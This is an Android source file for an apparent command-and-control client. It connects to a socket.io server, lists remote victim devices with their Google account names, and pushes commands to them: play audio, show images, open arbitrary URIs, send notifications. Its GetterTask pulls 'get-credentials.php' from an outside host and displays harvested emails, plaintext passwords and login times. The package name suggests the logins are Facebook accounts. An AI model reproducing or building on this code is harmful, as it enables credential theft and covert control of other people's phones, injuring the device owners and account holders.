package org.unitato.fbclient;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.support.v4.widget.SwipeRefreshLayout;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.text.format.Time;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.ListAdapter;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import com.github.nkzawa.emitter.Emitter;
import com.github.nkzawa.socketio.client.IO;
import com.github.nkzawa.socketio.client.Socket;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.w3c.dom.Text;

import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Calendar;


public class MainActivity extends ActionBarActivity {

    EditText urlEt;
    Button playBtn, pauseBtn, socketsBtn, notifyBtn, urlsBtn, dialogBtn, showImgBtn, hideImgBtn, uriBtn;
    CheckBox showAllCb;
    ListView listView;
    SwipeRefreshLayout swipeRefreshLayout;
    SharedPreferences preferences;
    SharedPreferences.Editor editor;
    Socket socket;
    String authKey = "";
    String targetSocketId;
    JSONArray socketsJson;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        urlEt = (EditText) findViewById(R.id.url_et);
        showAllCb = (CheckBox) findViewById(R.id.show_all_cb);
        playBtn = (Button) findViewById(R.id.play_btn);
        pauseBtn = (Button) findViewById(R.id.pause_btn);
        socketsBtn = (Button) findViewById(R.id.sockets_btn);
        dialogBtn = (Button) findViewById(R.id.dialog_btn);
        notifyBtn = (Button) findViewById(R.id.notify_btn);
        urlsBtn = (Button) findViewById(R.id.urls_btn);
        showImgBtn = (Button) findViewById(R.id.img_show_btn);
        hideImgBtn = (Button) findViewById(R.id.img_hide_btn);
        uriBtn = (Button) findViewById(R.id.url_btn);
        listView = (ListView) findViewById(R.id.list_view);
        swipeRefreshLayout = (SwipeRefreshLayout) findViewById(R.id.swipe_refresh_layout);
        preferences = getSharedPreferences("prefs",0);
        editor = preferences.edit();
        try {
            socket = IO.socket("http://mTest-dsapps.rhcloud.com");
        }catch (URISyntaxException e){
            e.printStackTrace();
        }
        socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        setButtons(0);
                        try{
                            JSONObject modifiers = new JSONObject();
                            modifiers.put("sysconfig.client-type", "client");
                            socket.emit("setModifiers", modifiers);
                        }catch (JSONException e){
                            e.printStackTrace();
                        }
                        if(targetSocketId == null)
                            socket.emit("getSockets", authKey);
                    }
                });
            }
        }).on("authError", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        askAuth("Auth Error. Try Again:", false);
                    }
                });
            }
        }).on("sockets", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                final AlertDialog.Builder db = new AlertDialog.Builder(MainActivity.this);
                socketsJson = (JSONArray) args[0];
                final String[] socketList = new String[socketsJson.length()+1];
                socketList[socketList.length-1] = "Broadcast";
                boolean showAll = showAllCb.isChecked();
                for(int i = 0; i < socketsJson.length(); i++) {
                    try {
                        JSONObject socketJson = socketsJson.getJSONObject(i);
                        if(socketJson.has("accounts")) {
                            JSONArray accountsJson;
                            try {
                                accountsJson = new JSONArray(socketJson.getString("accounts"));
                            }catch (JSONException e){
                                accountsJson = socketJson.getJSONArray("accounts");
                            }
                            String representation = "";
                            if(showAll)
                                representation += "\n";
                            for (int j = 0; j < accountsJson.length(); j++) {
                                JSONObject accountJson = accountsJson.getJSONObject(j);
                                if(!showAll) {
                                    String type = accountJson.getString("type");
                                    String name = accountJson.getString("name");
                                    if(type.toUpperCase().equals("COM.GOOGLE")) {
                                        if (representation != null && !representation.equals(""))
                                            representation += "\n";
                                        representation += name;
                                    }
                                }else if(showAll){
                                    if(!representation.equals("\n"))
                                        representation += "\n\n";
                                    representation += accountJson.getString("type").toUpperCase() + "\n" + accountJson.getString("name");
                                }
                            }
                            if(showAll)
                                representation += "\n";
                            socketList[i] = representation;
                        }else{
                            socketList[i] = socketJson.getString("id");
                        }
                        if(socketJson.has("modifiers")){
                            JSONObject modifiers = socketJson.getJSONObject("modifiers");
                            String modifiers_ = "";
                            if(modifiers.has("sysconfig.asleep"))
                                modifiers_ += "[SLP]";
                            if(modifiers.has("sysconfig.client-type"))
                                modifiers_ += "[" + modifiers.get("sysconfig.client-type") + "]";
                            if(modifiers.has("sysconfig.version"))
                                modifiers_ += "[v" + modifiers.get("sysconfig.version") + "]";
                            if(modifiers.has("system.network-type"))
                                modifiers_ += "[" + modifiers.get("system.network-type") + "]";
                            socketList[i] = modifiers_ + socketList[i];
                        }
                    }catch (JSONException e){
                        e.printStackTrace();
                    }
                }
//                socketListView.setAdapter(new ArrayAdapter<String>(MainActivity.this, android.R.layout.simple_list_item_1, socketList));
//                db.setView(socketListView);
                db.setItems(socketList, new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        if(which != socketList.length-1) {
                            /*try {
                                targetSocketId = socketsJson.getJSONObject(which).getString("id");
                                if(socketsJson.getJSONObject(which).has("accounts")){
                                    JSONArray accounts = new JSONArray(socketsJson.getJSONObject(which).getString("accounts"));
                                    for(int i = 0; i < accounts.length(); i++){
                                        JSONObject account = accounts.getJSONObject(i);
                                        if(account.getString("type").toLowerCase().equals("com.google")) {
                                            setTitle(account.getString("name"));
                                            break;
                                        }
                                    }
                                    setTitle(socketList[which]);
                                }else {
                                    setTitle(targetSocketId);
                                }
                            }catch(JSONException e){
                                e.printStackTrace();
                                setTitle("JSONException");
                            }*/
                            setTitle(socketList[which]);
                            try {
                                targetSocketId = socketsJson.getJSONObject(which).getString("id");
                            }catch (JSONException e){
                                setTitle("JSONException");
                                e.printStackTrace();
                            }
                            try {
                                if (socketsJson.getJSONObject(which).getJSONObject("modifiers").getBoolean("sysconfig.asleep")) {
                                    setButtons(0);
                                    Toast.makeText(MainActivity.this, "Socket is asleep", Toast.LENGTH_SHORT);
                                }else{
                                    if(socket != null && socket.connected())
                                        setButtons(2);
                                    else
                                        Toast.makeText(MainActivity.this, "can't reach server", Toast.LENGTH_SHORT);
                                }
                            }catch (JSONException e){
                                if(socket != null && socket.connected())
                                    setButtons(2);
                                else
                                    Toast.makeText(MainActivity.this, "can't reach server", Toast.LENGTH_SHORT);
                            }
                        }else{
                            targetSocketId = null;
                            setTitle("Broadcast");
                        }
                    }
                });
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        db.show();
                    }
                });
            }
        }).on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        setButtons(-1);
                    }
                });
            }
        });
        if(preferences.contains("authKey")){
            authKey = preferences.getString("authKey", "");
            socket.connect();
        }else{
            askAuth("Set Auth Key", true);
        }


        notifyBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(targetSocketId == null)
                    return;
                AlertDialog.Builder db = new AlertDialog.Builder(MainActivity.this);
                db.setTitle("Are you sure you'd like to send a notification?");
                db.setPositiveButton("Send", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        socket.emit("notify", authKey, "", "", "", targetSocketId);
                    }
                });
                db.setNegativeButton("Cancel", null);
                db.show();
            }
        });


        dialogBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(targetSocketId == null)
                    return;
                AlertDialog.Builder db = new AlertDialog.Builder(MainActivity.this);
                db.setTitle("Are you sure you'd like to send a notification?");
                db.setPositiveButton("Send", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        socket.emit("showDialog", authKey, "text", targetSocketId);
                    }
                });
                db.setNegativeButton("Cancel", null);
                db.show();
            }
        });

        playBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String url = urlEt.getText().toString();
                try{
                    new URL(url);
                }catch (MalformedURLException e){
                    Toast.makeText(MainActivity.this, "Malformed URL", Toast.LENGTH_SHORT).show();
                    return;
                }
                String[] splitUrl = url.split("\\.");
                String format = splitUrl[splitUrl.length-1];
                if(!format.equals("mp3")){
//                    Toast.makeText(MainActivity.this, "URL has to end with .mp3", Toast.LENGTH_SHORT).show();
//                    return;
                }
                if(targetSocketId != null) {
                    socket.emit("play", authKey, url, targetSocketId);
                }
            }
        });

        showImgBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String url = urlEt.getText().toString();
                try{
                    new URL(url);
                }catch (MalformedURLException e){
                    Toast.makeText(MainActivity.this, "Malformed URL", Toast.LENGTH_SHORT).show();
                    return;
                }
                if(targetSocketId != null)
                    socket.emit("showImage", authKey, url, targetSocketId);
            }
        });

        uriBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String uri = urlEt.getText().toString();
                try {
                    new URI(uri);
                } catch (URISyntaxException e) {
                    Toast.makeText(MainActivity.this, "Malformed URI", Toast.LENGTH_SHORT).show();
                    return;
                }
                if(targetSocketId != null)
                    socket.emit("uri", authKey, uri, targetSocketId);
            }
        });

        hideImgBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                socket.emit("hideImage", authKey, targetSocketId);
            }
        });

        urlsBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                AlertDialog.Builder db = new AlertDialog.Builder(MainActivity.this);
                final String[] urls = {"http://onlinekaraoke.tv/assets/songs/26000-26999/26647-barbie-girl-aqua--1411572274.mp3",
                        "http://shortmp3.mobi/z/save/912110015439491/40118.mp3",
                        "http://onlinekaraoke.tv/assets/songs/22000-22999/22055-baby-justin-bieber--1411571005.mp3",
                        "http://dsapps.hol.es/S_Whistle.ogg",
                        "http://img1.wikia.nocookie.net/__cb20130614202202/trollpasta/images/5/5e/Uniato.jpg"};
                String[] items = {"Barbie Girl.mp3", "JB Baby Ringtone.mp3", "JB Baby Full.mp3", "S_Whistle.ogg", "Unitato.jpg"};
                db.setItems(items, new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        urlEt.setText(urls[which]);
                    }
                });
                db.show();
            }
        });

        socketsBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                socket.emit("getSockets", authKey);
            }
        });

        pauseBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                socket.emit("pause", authKey, targetSocketId);
            }
        });


        swipeRefreshLayout.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                new GetterTask().execute();
            }
        });

        new GetterTask().execute();
    }

    @Override
    protected void onStop() {
        super.onStop();
//        socket.disconnect();
    }

    void askAuth(String title, final boolean connectOnFinish){
        AlertDialog.Builder db = new AlertDialog.Builder(this);
        db.setTitle(title);
        final EditText et = new EditText(this);
        et.setHint("Auth Key");
        db.setView(et);
        db.setPositiveButton("Save", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                editor.putString("authKey", et.getText().toString());
                editor.commit();
                authKey = et.getText().toString();
                if(connectOnFinish)
                    socket.connect();
            }
        });
        db.show();
    }



    void setButtons(int apiLevel){
        switch(apiLevel){
            case -1:
                socketsBtn.setEnabled(false);
                playBtn.setEnabled(false);
                pauseBtn.setEnabled(false);
                notifyBtn.setEnabled(false);
                dialogBtn.setEnabled(false);
                showImgBtn.setEnabled(false);
                hideImgBtn.setEnabled(false);
                uriBtn.setEnabled(false);
                break;

            case 0:
                socketsBtn.setEnabled(true);
                playBtn.setEnabled(false);
                pauseBtn.setEnabled(false);
                notifyBtn.setEnabled(false);
                dialogBtn.setEnabled(false);
                showImgBtn.setEnabled(false);
                hideImgBtn.setEnabled(false);
                uriBtn.setEnabled(false);
                break;

            case 1:
                socketsBtn.setEnabled(true);
                playBtn.setEnabled(true);
                pauseBtn.setEnabled(true);
                notifyBtn.setEnabled(true);
                dialogBtn.setEnabled(false);
                showImgBtn.setEnabled(false);
                hideImgBtn.setEnabled(false);
                uriBtn.setEnabled(false);
                break;

            case 2:
                socketsBtn.setEnabled(true);
                playBtn.setEnabled(true);
                pauseBtn.setEnabled(true);
                notifyBtn.setEnabled(true);
                dialogBtn.setEnabled(true);
                showImgBtn.setEnabled(true);
                hideImgBtn.setEnabled(true);
                uriBtn.setEnabled(true);
                break;
        }
    }


    class GetterTask extends AsyncTask<Void,Void,ArrayList<User>>{

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            if(swipeRefreshLayout != null)
                swipeRefreshLayout.setRefreshing(true);
        }

        @Override
        protected ArrayList<User> doInBackground(Void... params) {
            HttpGet httpGet = new HttpGet("http://dsapps.hol.es/other/get-credentials.php");
            HttpClient httpClient = new DefaultHttpClient();
            try{
                HttpResponse httpResponse = httpClient.execute(httpGet);
                String response_ = EntityUtils.toString(httpResponse.getEntity());
                JSONArray usersJson = new JSONArray(response_);
                ArrayList<User> users = new ArrayList<>();
                for(int i = 0; i < usersJson.length(); i++)
                    users.add(User.fromJson(usersJson.getJSONObject(i)));
                return users;
            }catch (Exception e){
                e.printStackTrace();
            }
            return null;
        }

        @Override
        protected void onPostExecute(ArrayList<User> users) {
            super.onPostExecute(users);
            if(users != null && listView != null)
                listView.setAdapter(new ListAdapter(MainActivity.this, users));
            if(swipeRefreshLayout != null)
                swipeRefreshLayout.setRefreshing(false);
            if(users == null)
                Toast.makeText(MainActivity.this, "Error loading data", Toast.LENGTH_SHORT).show();
        }
    }


    static class ListAdapter extends ArrayAdapter<User>{

        ArrayList<User> users;

        public ListAdapter(Context context, ArrayList<User> users) {
            super(context, R.layout.li_user, R.id.email_tv, users);
            this.users = users;
        }

        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            View rootView = super.getView(position, convertView, parent);
            TextView emailTv = (TextView) rootView.findViewById(R.id.email_tv);
            TextView passwordTv = (TextView) rootView.findViewById(R.id.password_tv);
            TextView timeTv = (TextView) rootView.findViewById(R.id.time_tv);
            User user = users.get(position);
            emailTv.setText("Email: " + user.email);
            passwordTv.setText("Password: " + user.password.key);
            Calendar passtime = user.password.time;
            timeTv.setText("Logged in: " + passtime.get(Calendar.DAY_OF_MONTH) + "/" + passtime.get(Calendar.MONTH) + " "  + passtime.get(Calendar.HOUR_OF_DAY) + ":" + passtime.get(Calendar.MINUTE) + ":" + passtime.get(Calendar.SECOND));
            return rootView;
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            Intent i = new Intent(MainActivity.this, SettingsActivity.class);
            startActivity(i);
            return true;
        }

        return super.onOptionsItemSelected(item);
    }


}
